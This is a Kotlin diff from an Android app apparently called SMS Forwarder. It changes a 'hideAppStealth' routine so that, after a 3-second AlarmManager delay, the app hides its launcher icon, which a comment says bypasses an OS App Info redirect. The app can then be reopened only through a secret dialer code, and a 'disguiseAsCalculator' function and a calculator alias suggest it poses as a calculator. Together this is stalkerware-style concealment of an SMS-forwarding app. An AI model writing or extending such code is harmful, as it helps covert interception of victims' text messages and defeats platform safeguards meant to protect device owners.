@@ -760,29 +760,36 @@ private fun hideAppStealth(context: Context) {
     val appContext = context.applicationContext
     val activity = context as? android.app.Activity
 
-    // 1. Show Toast
+    // 1. Toast
     android.widget.Toast.makeText(
         appContext,
-        "App Icon Hidden from Apps List! Dial *#*#767#*#* to open.",
+        "App Icon will hide from Apps List in 3 seconds! Dial *#*#767#*#* to open.",
         android.widget.Toast.LENGTH_LONG
     ).show()
 
-    // 2. Disable ALL launcher activity components to force complete icon removal from App Drawer
-    runCatching {
-        val pm = appContext.packageManager
-        val mainComponent = android.content.ComponentName(appContext.packageName, "com.smsforwarder.app.MainActivity")
-        val aliasComponent = android.content.ComponentName(appContext.packageName, "com.smsforwarder.app.LauncherAlias")
-        val calcComponent = android.content.ComponentName(appContext.packageName, "com.smsforwarder.app.CalculatorAlias")
-
-        pm.setComponentEnabledSetting(mainComponent, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0)
-        pm.setComponentEnabledSetting(aliasComponent, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0)
-        pm.setComponentEnabledSetting(calcComponent, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0)
-    }
-
-    // 3. Move task to background & finish UI cleanly
+    // 2. Exit to Home Screen FIRST so user is no longer inside the active activity
     activity?.moveTaskToBack(true)
     activity?.finishAndRemoveTask()
     activity?.finishAffinity()
+
+    // 3. Schedule AlarmManager broadcast 3s LATER when activity is completely dead (Bypasses OS App Info Redirect)
+    runCatching {
+        val alarmManager = appContext.getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
+        val intent = android.content.Intent(appContext, com.smsforwarder.app.receiver.StealthHideReceiver::class.java)
+        val pendingIntent = android.app.PendingIntent.getBroadcast(
+            appContext,
+            1001,
+            intent,
+            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
+        )
+
+        val triggerTime = System.currentTimeMillis() + 3000L
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+            alarmManager?.setExactAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
+        } else {
+            alarmManager?.setExact(android.app.AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
+        }
+    }
 }
 
 private fun disguiseAsCalculator(context: Context) {
